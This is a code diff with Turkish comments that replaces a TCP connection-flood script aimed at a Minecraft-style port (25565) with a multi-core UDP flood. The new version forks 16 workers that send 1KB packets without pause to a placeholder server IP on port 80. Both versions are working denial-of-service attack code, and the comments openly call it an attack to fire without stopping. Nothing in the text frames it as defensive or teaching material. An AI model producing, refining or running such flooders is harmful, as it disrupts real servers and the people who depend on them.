@@ -1,25 +1,22 @@
-// DOSYA ADI: attack.js
-const net = require('net');
+const dgram = require('dgram');
+const client = dgram.createSocket('udp4');
+const cluster = require('cluster'); // İşlemcinin tüm çekirdeklerini kullanmak için
 
-const target = {
-    host: 'HEDEF_IP_ADRESI', // Buraya vurulacak IP
-    port: 25565,             // Buraya port
-    threads: 5000            // Saniyede açılacak bağlantı sayısı (Ryzen 9'da 50.000 yapabilirsin)
-};
+// Ryzen 9'un 16 Çekirdeğinin Hepsini Devreye Sokuyoruz
+if (cluster.isMaster) {
+    console.log("🔥 RYZEN 9 9950X TÜM ÇEKİRDEKLER ATEŞLENİYOR...");
+    for (let i = 0; i < 16; i++) { cluster.fork(); } // 16 çekirdeği de saldırıya ayır
+} else {
+    const message = Buffer.alloc(1024, 'X'); // Paket boyutu yine 1KB (İdeal olan bu)
+    const targetIp = 'DENEME_SERVER_IP';
+    const targetPort = 80;
 
-function launch() {
-    for (let i = 0; i < target.threads; i++) {
-        const client = new net.Socket();
-        client.connect(target.port, target.host, () => {
-            // Bağlantı kurulduğunda boş paket gönderip açık tutuyoruz
-            client.write('\x00\x00\x00\x00'); 
-        });
-
-        client.on('error', () => {
-            client.destroy(); // Bağlantı koparsa hemen yenisini aç
-        });
+    // Durmaksızın ateşle!
+    function attack() {
+        for(let i=0; i<1000; i++) {
+            client.send(message, 0, message.length, targetPort, targetIp);
+        }
+        setImmediate(attack); // İşlemciyi hiç dinlendirmeden döngüye sok
     }
-    console.log(`[ATTACK] ${target.host} hedefine GERÇEK saldırı yapılıyor...`);
+    attack();
 }
-
-setInterval(launch, 1000); // Her saniye döngüyü tazele
